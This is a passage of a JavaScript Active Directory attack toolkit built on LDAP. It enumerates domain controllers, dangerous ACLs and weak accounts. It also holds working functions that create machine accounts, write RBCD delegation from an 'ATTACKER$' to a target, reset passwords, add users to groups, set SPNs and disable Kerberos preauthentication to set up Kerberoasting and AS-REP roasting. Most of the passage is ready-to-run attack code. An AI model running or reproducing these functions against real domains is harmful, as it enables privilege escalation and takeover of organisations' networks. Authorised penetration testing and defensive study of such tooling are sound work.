    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    let maq = 10;
    for await (const e of client.search({ baseDN: base, scope: SCOPE.BASE, filter: '(objectClass=*)', attributes: ['ms-DS-MachineAccountQuota'] })) {
      maq = parseInt(e.attributes?.['ms-DS-MachineAccountQuota'] || '10');
    }
    const dcs = await searchAll(client, base,
      '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))',
      ['sAMAccountName', 'dNSHostName', 'operatingSystem', 'operatingSystemVersion']);
    let vulnerable = false;
    for (const dc of dcs) {
      const os = dc.attributes?.operatingSystem || '';
      const ver = dc.attributes?.operatingSystemVersion || '';
      const sam = dc.attributes?.sAMAccountName || '';
      log('ok', 'ldap', host, sam, `${os} ${ver}`);
    }
    if (maq > 0) {
      log('warn', 'ldap', host, 'nopac', `MAQ=${maq} — users can create machine accounts`);
      log('warn', 'ldap', host, 'nopac', 'CVE-2021-42278/42287 (noPac/samAccountName) may be exploitable if DCs are unpatched');
      vulnerable = true;
    } else {
      log('ok', 'ldap', host, 'nopac', `MAQ=${maq} — machine account creation restricted`);
    }
    await client.unbind();
    return { maq, dcCount: dcs.length, vulnerable };
  } catch (e) {
    log('err', 'ldap', host, 'nopac', e.message);
    return null;
  }
}

export async function ldapDACL(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const dangerousRights = [
      { filter: '(&(objectClass=user)(adminCount=1))', label: 'admin users' },
      { filter: '(&(objectClass=group)(adminCount=1))', label: 'admin groups' },
    ];
    const interestingObjects = await searchAll(client, base,
      '(|(adminCount=1)(objectClass=computer)(objectClass=groupPolicyContainer))',
      ['sAMAccountName', 'cn', 'distinguishedName', 'objectClass', 'nTSecurityDescriptor'], true);
    let findings = 0;
    for (const e of interestingObjects) {
      const sam = e.attributes?.sAMAccountName || e.attributes?.cn || '';
      const sd = e.attributes?.nTSecurityDescriptor;
      if (!sd) continue;
      const rawSd = sd instanceof Uint8Array ? sd : Array.isArray(sd) ? sd[0] : null;
      if (!rawSd || rawSd.length < 20) continue;
      try {
        const dv = new DataView(rawSd.buffer || rawSd, rawSd.byteOffset || 0, rawSd.length);
        const daclOffset = dv.getUint32(16, true);
        if (daclOffset === 0 || daclOffset >= rawSd.length) continue;
        const aclSize = dv.getUint16(daclOffset + 2, true);
        const aceCount = dv.getUint16(daclOffset + 4, true);
        let aceOff = daclOffset + 8;
        for (let i = 0; i < aceCount && aceOff + 4 < rawSd.length; i++) {
          const aceType = rawSd[aceOff];
          const aceSize = dv.getUint16(aceOff + 2, true);
          if (aceType === 5 && aceSize >= 48) {
            const accessMask = dv.getUint32(aceOff + 4, true);
            const GENERIC_ALL = 0x10000000;
            const WRITE_DACL = 0x00040000;
            const WRITE_OWNER = 0x00080000;
            const ADS_RIGHT_DS_WRITE_PROP = 0x00000020;
            if (accessMask & (GENERIC_ALL | WRITE_DACL | WRITE_OWNER)) {
              findings++;
              const rights = [];
              if (accessMask & GENERIC_ALL) rights.push('GenericAll');
              if (accessMask & WRITE_DACL) rights.push('WriteDACL');
              if (accessMask & WRITE_OWNER) rights.push('WriteOwner');
              log('warn', 'ldap', host, sam, `dangerous ACE: ${rights.join(', ')}`);
            }
          }
          aceOff += aceSize;
        }
      } catch {}
    }
    log('ok', 'ldap', host, 'dacl', `scanned ${interestingObjects.length} objects, ${findings} dangerous ACE(s) found`);
    await client.unbind();
    return { scanned: interestingObjects.length, findings };
  } catch (e) {
    log('err', 'ldap', host, 'dacl', e.message);
    return null;
  }
}

export async function ldapSearch(host, creds, opts, log, filter) {
  if (!filter) { log('err', 'ldap', host, 'search', 'no LDAP filter specified'); return null; }
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, filter, ['sAMAccountName', 'cn', 'distinguishedName', 'description']);
    for (const e of entries) {
      const dn = e.attributes?.distinguishedName || e.dn || '';
      const sam = e.attributes?.sAMAccountName || e.attributes?.cn || '';
      log('ok', 'ldap', host, sam, dn);
    }
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'search', e.message);
    return null;
  }
}

function uacFlag(uac, bit) { return !!(parseInt(uac || '0') & bit); }

// --bloodhound removed — use the standalone sharphound / soaphound tools in
// the bundle for BloodHound-compatible collection.

function encodeUnicodePwd(password) {
  const quoted = `"${password}"`;
  const buf = new Uint8Array(quoted.length * 2);
  for (let i = 0; i < quoted.length; i++) {
    buf[i * 2] = quoted.charCodeAt(i) & 0xFF;
    buf[i * 2 + 1] = (quoted.charCodeAt(i) >> 8) & 0xFF;
  }
  return buf;
}

export async function ldapAddComputer(host, creds, opts, log, args) {
  if (!args || !args.trim()) {
    log('err', 'ldap', host, 'add-computer', 'usage: --add-computer NAME [PASSWORD]');
    return null;
  }
  const parts = args.trim().split(/\s+/);
  const compName = parts[0].replace(/\$$/, '');
  const compPwd = parts[1] || `${compName}123!`;
  if (!opts.tls) {
    log('err', 'ldap', host, 'add-computer', 'LDAPS (--tls) required for unicodePwd');
    return null;
  }
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const compDN = `CN=${compName},CN=Computers,${base}`;
    const fqdn = `${compName}.${domain}`;
    await client.add(compDN, [
      { name: 'objectClass', values: ['top', 'person', 'organizationalPerson', 'user', 'computer'] },
      { name: 'cn', values: [compName] },
      { name: 'sAMAccountName', values: [`${compName}$`] },
      { name: 'userAccountControl', values: ['4096'] },
      { name: 'dNSHostName', values: [fqdn] },
      { name: 'servicePrincipalName', values: [`HOST/${compName}`, `HOST/${fqdn}`, `RestrictedKrbHost/${compName}`, `RestrictedKrbHost/${fqdn}`] },
      { name: 'unicodePwd', values: [encodeUnicodePwd(compPwd)] },
    ]);
    log('ok', 'ldap', host, 'add-computer', `created ${compName}$ (password: ${compPwd})`);
    const entries = await searchAll(client, base, `(sAMAccountName=${compName}$)`, ['objectSid']);
    if (entries.length && entries[0].attributes?.objectSid) {
      const sidBytes = entries[0].attributes.objectSid;
      const raw = sidBytes instanceof Uint8Array ? sidBytes : Array.isArray(sidBytes) ? sidBytes[0] : null;
      if (raw) {
        const sidStr = parseSidToString(raw);
        log('ok', 'ldap', host, 'add-computer', `SID: ${sidStr}`);
      }
    }
    await client.unbind();
    return true;
  } catch (e) {
    log('err', 'ldap', host, 'add-computer', e.message);
    return null;
  }
}

function parseSidToString(buf) {
  if (buf.length < 8) return '(invalid SID)';
  const rev = buf[0];
  const subCount = buf[1];
  let auth = 0;
  for (let i = 2; i < 8; i++) auth = auth * 256 + buf[i];
  let s = `S-${rev}-${auth}`;
  const dv = new DataView(buf.buffer || new Uint8Array(buf).buffer, buf.byteOffset || 0, buf.length);
  for (let i = 0; i < subCount && 8 + i * 4 + 4 <= buf.length; i++) {
    s += `-${dv.getUint32(8 + i * 4, true)}`;
  }
  return s;
}

function buildRbcdSD(sidBytes) {
  const raw = sidBytes instanceof Uint8Array ? sidBytes : new Uint8Array(sidBytes);
  const aceSize = 8 + raw.length;
  const ace = new Uint8Array(aceSize);
  ace[0] = 0x00;
  const aceDV = new DataView(ace.buffer);
  aceDV.setUint16(2, aceSize, true);
  aceDV.setUint32(4, 0x000F003F, true);
  ace.set(raw, 8);
  const daclSize = 8 + aceSize;
  const dacl = new Uint8Array(daclSize);
  dacl[0] = 0x02;
  const daclDV = new DataView(dacl.buffer);
  daclDV.setUint16(2, daclSize, true);
  daclDV.setUint16(4, 1, true);
  dacl.set(ace, 8);
  const sdSize = 20 + daclSize;
  const sd = new Uint8Array(sdSize);
  sd[0] = 0x01;
  const sdDV = new DataView(sd.buffer);
  sdDV.setUint16(2, 0x8004, true);
  sdDV.setUint32(16, 20, true);
  sd.set(dacl, 20);
  return sd;
}

export async function ldapRbcd(host, creds, opts, log, args) {
  if (!args || !args.includes(' ')) {
    log('err', 'ldap', host, 'rbcd', 'usage: --rbcd ATTACKER$ TARGET$');
    return null;
  }
  const [attackerSam, targetSam] = args.trim().split(/\s+/);
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const attackerEntries = await searchAll(client, base,
      `(sAMAccountName=${attackerSam.includes('$') ? attackerSam : attackerSam + '$'})`,
      ['objectSid', 'sAMAccountName']);
    if (!attackerEntries.length) throw new Error(`attacker "${attackerSam}" not found`);
    const sidAttr = attackerEntries[0].attributes?.objectSid;
    const attackerSid = sidAttr instanceof Uint8Array ? sidAttr : Array.isArray(sidAttr) ? sidAttr[0] : null;
    if (!attackerSid) throw new Error('cannot read attacker objectSid');
    log('info', 'ldap', host, 'rbcd', `attacker SID: ${parseSidToString(attackerSid)}`);
    const targetEntries = await searchAll(client, base,
      `(sAMAccountName=${targetSam.includes('$') ? targetSam : targetSam + '$'})`,
      ['distinguishedName', 'sAMAccountName']);
    if (!targetEntries.length) throw new Error(`target "${targetSam}" not found`);
    const targetDN = targetEntries[0].dn || targetEntries[0].attributes?.distinguishedName;
    if (!targetDN) throw new Error('cannot resolve target DN');
    const sd = buildRbcdSD(attackerSid);
    await client.modify(targetDN, [{
      op: 'replace', attr: 'msDS-AllowedToActOnBehalfOfOtherIdentity', values: [sd],
    }]);
    log('ok', 'ldap', host, 'rbcd', `delegation set: ${attackerSam} → ${targetSam}`);
    await client.unbind();
    return true;
  } catch (e) {
    log('err', 'ldap', host, 'rbcd', e.message);
    return null;
  }
}

export async function ldapDelComputer(host, creds, opts, log, args) {
  if (!args || !args.trim()) {
    log('err', 'ldap', host, 'del-computer', 'usage: --del-computer NAME');
    return null;
  }
  const compName = args.trim().replace(/\$$/, '');
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, `(sAMAccountName=${compName}$)`, ['distinguishedName']);
    if (!entries.length) throw new Error(`computer "${compName}$" not found`);
    const dn = entries[0].dn || entries[0].attributes?.distinguishedName;
    if (!dn) throw new Error('cannot resolve DN');
    let dnStr = dn;
    if (dn instanceof Uint8Array || Array.isArray(dn)) {
      const raw = dn instanceof Uint8Array ? dn : dn[0];
      dnStr = new TextDecoder().decode(raw);
    }
    await client.delete(dnStr);
    log('ok', 'ldap', host, 'del-computer', `deleted ${compName}$ (${dnStr})`);
    await client.unbind();
    return true;
  } catch (e) {
    log('err', 'ldap', host, 'del-computer', e.message);
    return null;
  }
}

export async function ldapChangePwd(host, creds, opts, log, args) {
  if (!args || !args.includes(' ')) {
    log('err', 'ldap', host, 'changepwd', 'usage: --changepwd USER NEWPASS');
    return null;
  }
  if (!opts.tls) {
    log('err', 'ldap', host, 'changepwd', 'LDAPS (--tls) required for unicodePwd');
    return null;
  }
  const spaceIdx = args.indexOf(' ');
  const targetUser = args.slice(0, spaceIdx);
  const newPassword = args.slice(spaceIdx + 1);
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, `(sAMAccountName=${targetUser})`, ['distinguishedName']);
    if (!entries.length) throw new Error(`user "${targetUser}" not found`);
    const dn = entries[0].dn || entries[0].attributes?.distinguishedName;
    if (!dn) throw new Error('cannot resolve DN');
    let dnStr = dn;
    if (dn instanceof Uint8Array || Array.isArray(dn)) {
      const raw = dn instanceof Uint8Array ? dn : dn[0];
      dnStr = new TextDecoder().decode(raw);
    }
    await client.modify(dnStr, [{
      op: 'replace', attr: 'unicodePwd', values: [encodeUnicodePwd(newPassword)],
    }]);
    log('ok', 'ldap', host, 'changepwd', `password changed for ${targetUser}`);
    await client.unbind();
    return true;
  } catch (e) {
    log('err', 'ldap', host, 'changepwd', e.message);
    return null;
  }
}

export async function ldapRbcdClear(host, creds, opts, log, args) {
  if (!args || !args.trim()) {
    log('err', 'ldap', host, 'rbcd-clear', 'usage: --rbcd-clear TARGET$');
    return null;
  }
  const targetSam = args.trim();
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base,
      `(sAMAccountName=${targetSam.includes('$') ? targetSam : targetSam + '$'})`,
      ['distinguishedName', 'msDS-AllowedToActOnBehalfOfOtherIdentity']);
    if (!entries.length) throw new Error(`"${targetSam}" not found`);
    const dn = entries[0].dn || entries[0].attributes?.distinguishedName;
    if (!dn) throw new Error('cannot resolve DN');
    let dnStr = dn;
    if (dn instanceof Uint8Array || Array.isArray(dn)) {
      dnStr = new TextDecoder().decode(dn instanceof Uint8Array ? dn : dn[0]);
    }
    const rbcdAttr = entries[0].attributes?.['msDS-AllowedToActOnBehalfOfOtherIdentity'];
    if (!rbcdAttr) {
      log('ok', 'ldap', host, 'rbcd-clear', `${targetSam} has no RBCD delegation set`);
      await client.unbind();
      return true;
    }
    await client.modify(dnStr, [{
      op: 'delete', attr: 'msDS-AllowedToActOnBehalfOfOtherIdentity', values: [],
    }]);
    log('ok', 'ldap', host, 'rbcd-clear', `RBCD delegation cleared on ${targetSam}`);
    await client.unbind();
    return true;
  } catch (e) {
    log('err', 'ldap', host, 'rbcd-clear', e.message);
    return null;
  }
}

export async function ldapDisableUser(host, creds, opts, log, args) {
  if (!args || !args.trim()) {
    log('err', 'ldap', host, 'disable', 'usage: --disable-user SAM');
    return null;
  }
  const targetSam = args.trim();
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, `(sAMAccountName=${targetSam})`, ['distinguishedName', 'userAccountControl']);
    if (!entries.length) throw new Error(`"${targetSam}" not found`);
    const dn = entries[0].dn || entries[0].attributes?.distinguishedName;
    let dnStr = dn;
    if (dn instanceof Uint8Array || Array.isArray(dn)) {
      dnStr = new TextDecoder().decode(dn instanceof Uint8Array ? dn : dn[0]);
    }
    let uacRaw = entries[0].attributes?.userAccountControl;
    if (Array.isArray(uacRaw)) uacRaw = uacRaw[0];
    if (uacRaw instanceof Uint8Array) uacRaw = new TextDecoder().decode(uacRaw);
    const uac = parseInt(uacRaw || '512');
    const newUac = uac | 0x2;
    await client.modify(dnStr, [{ op: 'replace', attr: 'userAccountControl', values: [String(newUac)] }]);
    log('ok', 'ldap', host, 'disable', `${targetSam} disabled (UAC ${uac} → ${newUac})`);
    await client.unbind();
    return true;
  } catch (e) {
    log('err', 'ldap', host, 'disable', e.message);
    return null;
  }
}

export async function ldapEnableUser(host, creds, opts, log, args) {
  if (!args || !args.trim()) {
    log('err', 'ldap', host, 'enable', 'usage: --enable-user SAM');
    return null;
  }
  const targetSam = args.trim();
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, `(sAMAccountName=${targetSam})`, ['distinguishedName', 'userAccountControl']);
    if (!entries.length) throw new Error(`"${targetSam}" not found`);
    const dn = entries[0].dn || entries[0].attributes?.distinguishedName;
    let dnStr = dn;
    if (dn instanceof Uint8Array || Array.isArray(dn)) {
      dnStr = new TextDecoder().decode(dn instanceof Uint8Array ? dn : dn[0]);
    }
    let uacRaw = entries[0].attributes?.userAccountControl;
    if (Array.isArray(uacRaw)) uacRaw = uacRaw[0];
    if (uacRaw instanceof Uint8Array) uacRaw = new TextDecoder().decode(uacRaw);
    const uac = parseInt(uacRaw || '514');
    const newUac = uac & ~0x2;
    await client.modify(dnStr, [{ op: 'replace', attr: 'userAccountControl', values: [String(newUac)] }]);
    log('ok', 'ldap', host, 'enable', `${targetSam} enabled (UAC ${uac} → ${newUac})`);
    await client.unbind();
    return true;
  } catch (e) {
    log('err', 'ldap', host, 'enable', e.message);
    return null;
  }
}

function resolveDN(entry) {
  const dn = entry.dn || entry.attributes?.distinguishedName;
  if (!dn) return null;
  if (typeof dn === 'string') return dn;
  if (dn instanceof Uint8Array) return new TextDecoder().decode(dn);
  if (Array.isArray(dn)) {
    const raw = dn[0];
    return raw instanceof Uint8Array ? new TextDecoder().decode(raw) : String(raw);
  }
  return String(dn);
}

export async function ldapAddGroupMember(host, creds, opts, log, args) {
  if (!args || !args.includes(' ')) {
    log('err', 'ldap', host, 'add-member', 'usage: --add-member USER GROUP');
    return null;
  }
  const [userSam, groupSam] = args.trim().split(/\s+/);
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const userEntries = await searchAll(client, base, `(sAMAccountName=${userSam})`, ['distinguishedName']);
    if (!userEntries.length) throw new Error(`user "${userSam}" not found`);
    const userDN = resolveDN(userEntries[0]);
    if (!userDN) throw new Error('cannot resolve user DN');
    const groupEntries = await searchAll(client, base, `(sAMAccountName=${groupSam})`, ['distinguishedName']);
    if (!groupEntries.length) throw new Error(`group "${groupSam}" not found`);
    const groupDN = resolveDN(groupEntries[0]);
    if (!groupDN) throw new Error('cannot resolve group DN');
    await client.modify(groupDN, [{ op: 'add', attr: 'member', values: [userDN] }]);
    log('ok', 'ldap', host, 'add-member', `added ${userSam} to ${groupSam}`);
    await client.unbind();
    return true;
  } catch (e) {
    log('err', 'ldap', host, 'add-member', e.message);
    return null;
  }
}

export async function ldapRemoveGroupMember(host, creds, opts, log, args) {
  if (!args || !args.includes(' ')) {
    log('err', 'ldap', host, 'rm-member', 'usage: --rm-member USER GROUP');
    return null;
  }
  const [userSam, groupSam] = args.trim().split(/\s+/);
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const userEntries = await searchAll(client, base, `(sAMAccountName=${userSam})`, ['distinguishedName']);
    if (!userEntries.length) throw new Error(`user "${userSam}" not found`);
    const userDN = resolveDN(userEntries[0]);
    if (!userDN) throw new Error('cannot resolve user DN');
    const groupEntries = await searchAll(client, base, `(sAMAccountName=${groupSam})`, ['distinguishedName']);
    if (!groupEntries.length) throw new Error(`group "${groupSam}" not found`);
    const groupDN = resolveDN(groupEntries[0]);
    if (!groupDN) throw new Error('cannot resolve group DN');
    await client.modify(groupDN, [{ op: 'delete', attr: 'member', values: [userDN] }]);
    log('ok', 'ldap', host, 'rm-member', `removed ${userSam} from ${groupSam}`);
    await client.unbind();
    return true;
  } catch (e) {
    log('err', 'ldap', host, 'rm-member', e.message);
    return null;
  }
}

export async function ldapSetSPN(host, creds, opts, log, args) {
  if (!args || !args.includes(' ')) {
    log('err', 'ldap', host, 'set-spn', 'usage: --set-spn SAM SPN');
    return null;
  }
  const spaceIdx = args.indexOf(' ');
  const targetSam = args.slice(0, spaceIdx);
  const spn = args.slice(spaceIdx + 1);
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, `(sAMAccountName=${targetSam})`, ['distinguishedName', 'servicePrincipalName']);
    if (!entries.length) throw new Error(`"${targetSam}" not found`);
    const dn = resolveDN(entries[0]);
    if (!dn) throw new Error('cannot resolve DN');
    await client.modify(dn, [{ op: 'add', attr: 'servicePrincipalName', values: [spn] }]);
    log('ok', 'ldap', host, 'set-spn', `added SPN "${spn}" on ${targetSam}`);
    await client.unbind();
    return true;
  } catch (e) {
    log('err', 'ldap', host, 'set-spn', e.message);
    return null;
  }
}

export async function ldapClearSPN(host, creds, opts, log, args) {
  if (!args || !args.includes(' ')) {
    log('err', 'ldap', host, 'clear-spn', 'usage: --clear-spn SAM SPN');
    return null;
  }
  const spaceIdx = args.indexOf(' ');
  const targetSam = args.slice(0, spaceIdx);
  const spn = args.slice(spaceIdx + 1);
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, `(sAMAccountName=${targetSam})`, ['distinguishedName']);
    if (!entries.length) throw new Error(`"${targetSam}" not found`);
    const dn = resolveDN(entries[0]);
    if (!dn) throw new Error('cannot resolve DN');
    await client.modify(dn, [{ op: 'delete', attr: 'servicePrincipalName', values: [spn] }]);
    log('ok', 'ldap', host, 'clear-spn', `removed SPN "${spn}" from ${targetSam}`);
    await client.unbind();
    return true;
  } catch (e) {
    log('err', 'ldap', host, 'clear-spn', e.message);
    return null;
  }
}

export async function ldapSetDesc(host, creds, opts, log, args) {
  if (!args || !args.includes(' ')) {
    log('err', 'ldap', host, 'set-desc', 'usage: --set-desc SAM "description text"');
    return null;
  }
  const spaceIdx = args.indexOf(' ');
  const targetSam = args.slice(0, spaceIdx);
  const description = args.slice(spaceIdx + 1);
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, `(sAMAccountName=${targetSam})`, ['distinguishedName']);
    if (!entries.length) throw new Error(`"${targetSam}" not found`);
    const dn = resolveDN(entries[0]);
    if (!dn) throw new Error('cannot resolve DN');
    await client.modify(dn, [{ op: 'replace', attr: 'description', values: [description] }]);
    log('ok', 'ldap', host, 'set-desc', `set description on ${targetSam}: "${description}"`);
    await client.unbind();
    return true;
  } catch (e) {
    log('err', 'ldap', host, 'set-desc', e.message);
    return null;
  }
}

export async function ldapSetDontReqPreauth(host, creds, opts, log, args) {
  if (!args || !args.trim()) {
    log('err', 'ldap', host, 'set-asrep', 'usage: --set-asrep SAM');
    return null;
  }
  const targetSam = args.trim();
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, `(sAMAccountName=${targetSam})`, ['distinguishedName', 'userAccountControl']);
    if (!entries.length) throw new Error(`"${targetSam}" not found`);
    const dn = resolveDN(entries[0]);
    if (!dn) throw new Error('cannot resolve DN');
    let uacRaw = entries[0].attributes?.userAccountControl;
    if (Array.isArray(uacRaw)) uacRaw = uacRaw[0];
    if (uacRaw instanceof Uint8Array) uacRaw = new TextDecoder().decode(uacRaw);
    const uac = parseInt(uacRaw || '512');
    const newUac = uac | 0x400000;
    await client.modify(dn, [{ op: 'replace', attr: 'userAccountControl', values: [String(newUac)] }]);
    log('ok', 'ldap', host, 'set-asrep', `DONT_REQ_PREAUTH set on ${targetSam} (UAC ${uac} → ${newUac})`);
    await client.unbind();
    return true;
  } catch (e) {
    log('err', 'ldap', host, 'set-asrep', e.message);
    return null;
  }
}

export async function ldapClearDontReqPreauth(host, creds, opts, log, args) {
  if (!args || !args.trim()) {
    log('err', 'ldap', host, 'clear-asrep', 'usage: --clear-asrep SAM');
    return null;
  }
  const targetSam = args.trim();
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, `(sAMAccountName=${targetSam})`, ['distinguishedName', 'userAccountControl']);
    if (!entries.length) throw new Error(`"${targetSam}" not found`);
    const dn = resolveDN(entries[0]);
    if (!dn) throw new Error('cannot resolve DN');
    let uacRaw = entries[0].attributes?.userAccountControl;
    if (Array.isArray(uacRaw)) uacRaw = uacRaw[0];
    if (uacRaw instanceof Uint8Array) uacRaw = new TextDecoder().decode(uacRaw);
    const uac = parseInt(uacRaw || '512');
    const newUac = uac & ~0x400000;
    await client.modify(dn, [{ op: 'replace', attr: 'userAccountControl', values: [String(newUac)] }]);
    log('ok', 'ldap', host, 'clear-asrep', `DONT_REQ_PREAUTH cleared on ${targetSam} (UAC ${uac} → ${newUac})`);
    await client.unbind();
    return true;
  } catch (e) {
    log('err', 'ldap', host, 'clear-asrep', e.message);
    return null;
  }
}

export async function ldapGetSid(host, creds, opts, log, args) {
  if (!args || !args.trim()) {
    log('err', 'ldap', host, 'get-sid', 'usage: --get-sid sAMAccountName');
    return null;
  }
  const sam = args.trim();
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, `(sAMAccountName=${sam})`, ['objectSid', 'distinguishedName', 'objectClass']);
    if (!entries.length) { log('err', 'ldap', host, 'get-sid', `"${sam}" not found`); return null; }
    const e = entries[0];
    const sid = e.attributes?.objectSid;
    if (sid && sid instanceof Uint8Array) {
      log('ok', 'ldap', host, sam, `SID: ${parseSidToString(sid)}`);
    } else {
      log('warn', 'ldap', host, sam, 'no objectSid attribute');
    }
    const dn = resolveDN(e);
    if (dn) log('info', 'ldap', host, sam, `DN: ${dn}`);
    await client.unbind();
    return true;
  } catch (e) {
    log('err', 'ldap', host, 'get-sid', e.message);
    return null;
  }
}

export async function ldapMachineQuota(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, '(objectClass=domain)', ['ms-DS-MachineAccountQuota', 'distinguishedName']);
    if (entries.length) {
      let maq = entries[0].attributes?.['ms-DS-MachineAccountQuota'];
      if (Array.isArray(maq)) maq = maq[0];
      if (maq instanceof Uint8Array) maq = new TextDecoder().decode(maq);
      log('ok', 'ldap', host, 'maq-full', `MachineAccountQuota: ${maq || 'N/A'}`);
    }
    const userEntries = await searchAll(client, base, `(sAMAccountName=${creds.user})`, ['ms-DS-CreatorSID']);
    const created = await searchAll(client, base, `(ms-DS-CreatorSID=*)`, ['sAMAccountName', 'ms-DS-CreatorSID']);
    const userSam = creds.user.toLowerCase();
    let owned = 0;
    for (const e of created) {
      const sam = e.attributes?.sAMAccountName;
      if (sam) owned++;
    }
    log('info', 'ldap', host, 'maq-full', `total machine accounts with creator SID: ${created.length}`);
    await client.unbind();
    return true;
  } catch (e) {
    log('err', 'ldap', host, 'maq-full', e.message);
    return null;
  }
}

export async function ldapPasswordNotReqd(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, '(&(userAccountControl:1.2.840.113556.1.4.803:=32)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))', ['sAMAccountName', 'distinguishedName', 'description']);
    if (!entries.length) {
      log('info', 'ldap', host, 'passnotreqd', 'no enabled accounts with PASSWD_NOTREQD');
    }
    for (const e of entries) {
      const sam = e.attributes?.sAMAccountName || '?';
      let desc = e.attributes?.description || '';
      if (Array.isArray(desc)) desc = desc[0] || '';
      if (desc instanceof Uint8Array) desc = new TextDecoder().decode(desc);
      log('ok', 'ldap', host, sam, `PASSWD_NOTREQD${desc ? ' — ' + desc : ''}`);
    }
    log('ok', 'ldap', host, 'passnotreqd', `${entries.length} account(s) with PASSWD_NOTREQD flag`);
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'passnotreqd', e.message);
    return null;
  }
}

export async function ldapNeverExpires(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, '(&(userAccountControl:1.2.840.113556.1.4.803:=65536)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))', ['sAMAccountName', 'pwdLastSet', 'description']);
    for (const e of entries) {
      const sam = e.attributes?.sAMAccountName || '?';
      let pwdLast = e.attributes?.pwdLastSet;
      if (Array.isArray(pwdLast)) pwdLast = pwdLast[0];
      if (pwdLast instanceof Uint8Array) pwdLast = new TextDecoder().decode(pwdLast);
      const pwdTs = pwdLast ? formatAdTimestamp(pwdLast) : 'never';
      log('ok', 'ldap', host, sam, `DONT_EXPIRE_PASSWORD — pwdLastSet: ${pwdTs}`);
    }
    log('ok', 'ldap', host, 'never-expires', `${entries.length} enabled account(s) with non-expiring passwords`);
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'never-expires', e.message);
    return null;
  }
}

function formatAdTimestamp(val) {
  const ts = BigInt(val);
  if (ts === 0n || ts === 9223372036854775807n) return 'never';
  const ms = Number((ts - 116444736000000000n) / 10000n);
  try { return new Date(ms).toISOString().replace('T', ' ').slice(0, 19); } catch { return String(val); }
}

export async function ldapObsolete(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const osFilter = '(|(operatingSystem=*2003*)(operatingSystem=*2008*)(operatingSystem=*XP*)(operatingSystem=*Vista*)(operatingSystem=*7 *)(operatingSystem=*Windows 8 *)(operatingSystem=*2012*))';
    const entries = await searchAll(client, base, `(&(objectClass=computer)${osFilter})`, ['sAMAccountName', 'operatingSystem', 'operatingSystemVersion', 'lastLogonTimestamp']);
    for (const e of entries) {
      const sam = e.attributes?.sAMAccountName || '?';
      let os = e.attributes?.operatingSystem || '';
      if (Array.isArray(os)) os = os[0];
      if (os instanceof Uint8Array) os = new TextDecoder().decode(os);
      let lastLogon = e.attributes?.lastLogonTimestamp;
      if (Array.isArray(lastLogon)) lastLogon = lastLogon[0];
      if (lastLogon instanceof Uint8Array) lastLogon = new TextDecoder().decode(lastLogon);
      const lastTs = lastLogon ? formatAdTimestamp(lastLogon) : 'unknown';
      log('ok', 'ldap', host, sam, `${os} — last logon: ${lastTs}`);
    }
    log('ok', 'ldap', host, 'obsolete', `${entries.length} legacy/obsolete computer(s)`);
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'obsolete', e.message);
    return null;
  }
}

export async function ldapLocked(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, '(&(objectClass=user)(lockoutTime>=1))', ['sAMAccountName', 'lockoutTime', 'badPwdCount']);
    for (const e of entries) {
      const sam = e.attributes?.sAMAccountName || '?';
      let lockout = e.attributes?.lockoutTime;
      if (Array.isArray(lockout)) lockout = lockout[0];
      if (lockout instanceof Uint8Array) lockout = new TextDecoder().decode(lockout);
      const ts = lockout ? formatAdTimestamp(lockout) : 'unknown';
      let bad = e.attributes?.badPwdCount;
      if (Array.isArray(bad)) bad = bad[0];
      if (bad instanceof Uint8Array) bad = new TextDecoder().decode(bad);
      log('ok', 'ldap', host, sam, `locked since ${ts} — badPwdCount: ${bad || '?'}`);
    }
    log('ok', 'ldap', host, 'locked', `${entries.length} locked account(s)`);
    await client.unbind();
    return entries;
  } catch (e) {
    log('err', 'ldap', host, 'locked', e.message);
    return null;
  }
}

export async function ldapDisabled(host, creds, opts, log) {
  try {
    const { client, domain } = await connect(host, creds, opts);
    const base = baseDN(domain);
    const entries = await searchAll(client, base, '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))', ['sAMAccountName', 'description']);
